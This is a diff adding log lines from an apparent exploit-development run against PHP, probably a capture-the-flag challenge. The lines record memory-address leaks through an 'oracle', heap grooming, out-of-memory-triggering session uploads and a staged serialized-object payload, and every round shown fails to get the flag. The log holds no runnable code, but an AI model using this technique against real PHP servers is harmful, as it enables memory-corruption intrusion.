@@ -89,3 +89,50 @@
 [2026-10-22 00:27:59] place: pid=56 d_chunk head=d08f97062ffa000006000000ffffffff (last=0xfa2f06978fd0) - no groom
 [2026-10-22 00:28:00] place: pid=567 d_chunk head=d08f97062ffa000006000000ffffffff (last=0xfa2f06978fd0) - no groom
 [2026-10-22 00:28:00] place: pid=617 d_chunk head=00000000000000000000000000000000 (last=0x0) - no groom
+[2026-10-22 00:28:28] === round bf1: cpid=2993804 bias=0xf61100360000 basic_globals=0xf6110127e748
+[2026-10-22 00:28:28] baseline read: 6 children [19, 20, 21, 22, 23, 24]
+[2026-10-22 00:28:28] staged producer session sess_a002828aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 00:28:29] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 00:28:29] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 00:28:29] ORACLE cand: pid=21 off=816 data=0xf610fe26a000 level=1
+[2026-10-22 00:28:29] ORACLE: child=21 &BG(unserialize).data=0xf6110127ea78 d_chunk=0xf610fe26a000
+[2026-10-22 00:28:29] groom payload built: 8192B, LG=0xf610fe26b000
+[2026-10-22 00:28:29] staged consumer session sess_b002828bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 00:28:29] benign mode: dtor ptrs -> 0xf61101282000, token poc|i:1;
+[2026-10-22 00:28:29] consumer: t=0.4s len=6 FLAG=no
+[2026-10-22 00:28:29] consumer body:  <EOF>
+[2026-10-22 00:28:29] benign post: d_chunk head = 00000000000000000000000000000000 groom_sig=False (expect 0000280111f60000)
+[2026-10-22 00:29:29] kids(host,ns): [(2995640, 18), (2995641, 19), (2995642, 20), (2995643, 21), (2995644, 22), (2995703, 23)]
+[2026-10-22 00:29:29] pinned child ns=18 host=2995640; stopped [2995641, 2995642, 2995643, 2995644, 2995703]
+[2026-10-22 00:29:31] producer: t=0.1s oom=True len=553
+[2026-10-22 00:29:31] oracle: &BG(unserialize).data=0xf775dda9ea78 d=0xf775daa6a000 bias=0xf775dcb80000
+[2026-10-22 00:29:32] consumer: t=0.4s len=6 FLAG=None
+[2026-10-22 00:29:32] cleanup: SIGCONT sent
+[2026-10-22 00:34:13] === round w1: cpid=2995515 bias=0xf775dcb80000 basic_globals=0xf775dda9e748
+[2026-10-22 00:34:13] baseline read: 5 children [19, 20, 21, 22, 23]
+[2026-10-22 00:34:14] staged producer session sess_a003413aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 00:34:14] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 00:34:14] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 00:34:14] ORACLE cand: pid=23 off=816 data=0xf775daa6a000 level=1
+[2026-10-22 00:34:14] ORACLE: child=23 &BG(unserialize).data=0xf775dda9ea78 d_chunk=0xf775daa6a000
+[2026-10-22 00:34:14] groom payload built: 8192B, LG=0xf775daa6b000
+[2026-10-22 00:34:14] staged consumer session sess_b003413bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 00:34:14] consumer: t=0.3s len=6 FLAG=no
+[2026-10-22 00:34:14] consumer body:  <EOF>
+[2026-10-22 00:38:26] kids(host,ns): [(3005203, 19), (3005204, 20), (3005205, 21), (3005206, 22), (3005207, 23)]
+[2026-10-22 00:38:26] pinned child ns=19 host=3005203; stopped [3005204, 3005205, 3005206, 3005207]
+[2026-10-22 00:38:28] producer: t=0.1s oom=True len=553
+[2026-10-22 00:38:28] dbg oracle cand off=816 data=0xfbd6bd06a000 level=1
+[2026-10-22 00:38:28] oracle: &BG(unserialize).data=0xfbd6bffdea78 d=0xfbd6bd06a000 bias=0xfbd6bf0c0000
+[2026-10-22 00:38:29] consumer: t=0.4s len=6 FLAG=None
+[2026-10-22 00:38:29] cleanup: SIGCONT sent
+[2026-10-22 00:39:18] === round p5: cpid=3005106 bias=0xfbd6bf0c0000 basic_globals=0xfbd6bffde748
+[2026-10-22 00:39:18] baseline read: 5 children [20, 21, 22, 23, 41]
+[2026-10-22 00:39:18] place: comb=438272B filler=430080 payload_base=0xfa2f0ea6a000(expected)
+[2026-10-22 00:39:24] place: t=5.3s len=68693 tail=b'\n</body>\n</html>\n\r\n0\r\n\r\n\n<EOF>'
+[2026-10-22 00:39:24] place: pid=20 groom-sig hits: NOTFOUND
+[2026-10-22 00:39:24] place: pid=21 groom-sig hits: NOTFOUND
+[2026-10-22 00:39:24] place: pid=22 groom-sig hits: NOTFOUND
+[2026-10-22 00:39:24] place: pid=23 groom-sig hits: NOTFOUND
+[2026-10-22 00:39:24] place: pid=41 groom-sig hits: 0xfbd6bd139018 0xfbd6bd1aa018
+[2026-10-22 00:39:24] place: pid=65 groom-sig hits: NOTFOUND
